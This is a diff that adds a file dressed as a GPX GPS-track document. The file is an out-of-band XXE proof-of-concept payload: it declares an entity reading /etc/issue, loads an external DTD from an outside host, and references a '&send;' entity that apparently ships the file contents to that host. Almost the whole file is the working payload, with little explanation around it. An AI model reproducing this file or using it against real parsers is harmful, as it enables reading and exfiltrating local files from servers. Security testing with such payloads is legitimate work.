@@ -1,0 +1,2 @@
+<!DOCTYPE roottag [ <!ENTITY % file SYSTEM "file:///etc/issue"> <!ENTITY % dtd SYSTEM "http://www.davidsopas.com/poc/xxe.dtd"> %dtd;]> <gpx version="1.0" creator="GPSBabel - http://www.gpsbabel.org"xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://www.topografix.com/GPX/1/0" xsi:schemaLocation="http://www.topografix.com/GPX/1/1 http://www.topografix.com\ /GPX/1/1/gpx.xsd"> <time>2015-10-29T12:53:09Z</time> <bounds minlat="40.734267000" minlon="-8.265529000" maxlat="40.881475000" maxlon\ ="-8.037170000"/><trk>
+<name>&send;</name>
